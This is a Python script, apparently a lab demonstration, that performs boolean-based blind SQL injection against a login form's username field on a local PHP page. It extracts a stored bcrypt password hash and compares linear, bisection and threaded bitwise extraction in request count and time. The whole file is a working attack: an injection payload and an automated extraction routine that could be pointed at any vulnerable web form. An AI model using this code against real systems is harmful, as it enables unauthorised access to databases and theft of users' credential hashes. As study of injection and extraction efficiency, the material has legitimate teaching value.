#!/usr/bin/python3

# William Moody (@bmdyy)
# 30.11.2022

import requests
import sys
import time
import threading
from urllib.parse import quote_plus

PWD_LENGTH = 60 # Assumed knowledge
N_THREADS = 5 # For SQL-ANDING

num_requests = 0
def oracle(q):
    global num_requests
    num_requests += 1
    r = requests.post(
        "http://0.0.0.0/index.php",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="username=" + quote_plus("bmdyy' AND (" + q + ")-- -")
    )
    return "Email was sent!" in r.text

# Verify the oracle works
assert oracle("1=1")
assert not oracle("1=2")
print("[+] Oracle verified\n")

def regular():
    password = ""
    for index in range(1, PWD_LENGTH + 1):
        for char in range(0, 256):
            if oracle("ASCII(MID(password,%d,1)) = %d" % (index, char)):
                password += chr(char)
                # sys.stdout.write(chr(char))
                # sys.stdout.flush()
                break
    return password

def bisection():
    password = ""
    for index in range(1, PWD_LENGTH + 1):
        low = 0
        high = 255
        mid = 0
        while low <= high:
            mid = (low + high) // 2
            if oracle("ASCII(MID(password,%d,1)) > %d" % (index, mid)):
                low = mid + 1
            else:
                high = mid - 1
        password += chr(low)
        # sys.stdout.write(chr(low))
        # sys.stdout.flush()
    return password

shm_password = [' '] * PWD_LENGTH
def sqlAnding():
    global shm_password
    chunk = int(PWD_LENGTH / N_THREADS)
    threads = []
    for i in range(N_THREADS):
        indices = range(chunk * i + 1, chunk * i + chunk + 1)
        t = threading.Thread(target=sqlAnding_thread, args=(indices,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return ''.join(shm_password)

def sqlAnding_thread(indices):
    global shm_password
    for index in indices:
        char = 0
        for i in range(0, 7):
            if oracle("ASCII(MID(password,%d,1)) & %d" % (index, 2**i)):
                char += 2**i
        shm_password[index-1] = chr(char)
        # sys.stdout.write('\b' * (PWD_LENGTH+4))
        # sys.stdout.write('[+] ')
        # sys.stdout.write(''.join(shm_password))
        # sys.stdout.flush()

for i in range(0, 3):
    num_requests = 0
    start = time.time()

    if i == 0:
        print("--- REGULAR ---")
        password = regular()
    elif i == 1:
        print("--- BISECTION ---")
        password = bisection()
    elif i == 2:
        print("--- SQL-ANDING (N=%d) ---" % N_THREADS)
        password = sqlAnding()

    elapsed = time.time() - start
    print("[+] %s" % password)

    # Verify the password was dumped correctly
    assert password == "$2a$12$rO4AtoGODYaXVOgto5ADa.kfN.kiOYMnW9grfpKl283jrfoIK2Mji"

    print("\n[*] Total number of requests: %d" % num_requests)
    print("[*] Avg. requests per char: %.3f" % (num_requests / PWD_LENGTH))
    print("[*] Time elapsed: %.3f seconds\n" % elapsed)